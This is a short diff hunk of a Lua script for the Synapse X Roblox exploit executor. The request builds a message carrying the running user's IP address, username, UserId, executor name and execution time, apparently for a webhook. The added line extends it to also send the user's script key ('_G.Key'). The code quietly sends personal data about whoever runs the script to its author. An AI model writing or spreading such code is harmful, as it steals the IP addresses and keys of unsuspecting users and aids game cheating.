@@ -7,7 +7,7 @@ local response = syn.request(
         Headers = {
             ['Content-Type'] = 'application/json'
         },
-        Body = game:GetService('HttpService'):JSONEncode({content = "```css" .. "\n" .. "[IP]: " .. lib .. "\n" .. "[Username]: " ..game.Players.LocalPlayer.Name .. "\n" .. "[UserId]: " .. game.Players.LocalPlayer.UserId .. "\n" .. "[Exploit]: Synapse X" .. "\n" .. "[Script]: Alternate" .. "\n" .. "[Execution Time]: " .. tick() - started .. " seconds" .. "```"})
+        Body = game:GetService('HttpService'):JSONEncode({content = "```css" .. "\n" .. "[IP]: " .. lib .. "\n" .. "[Username]: " ..game.Players.LocalPlayer.Name .. "\n" .. "[UserId]: " .. game.Players.LocalPlayer.UserId .. "\n" .. "[Exploit]: Synapse X" .. "\n" .. "[Script]: Alternate" .. "\n" .. "[Execution Time]: " .. tick() - started .. " seconds" .. "\n" .. "[Key]: " .. _G.Key .. "```"})
     }
 );
 
